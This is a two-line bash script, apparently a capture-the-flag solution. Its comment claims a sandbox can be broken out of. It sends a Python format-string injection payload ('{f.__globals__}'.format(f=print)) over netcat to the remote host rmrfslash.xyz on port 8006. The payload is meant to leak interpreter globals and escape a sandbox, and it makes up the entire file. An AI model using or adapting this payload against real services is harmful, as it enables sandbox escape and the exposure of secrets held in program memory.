#!/bin/bash

# I don't think you can get shell access, but you can break out of the sandboxing
echo "'{f.__globals__}'.format(f=print)" | nc rmrfslash.xyz 8006
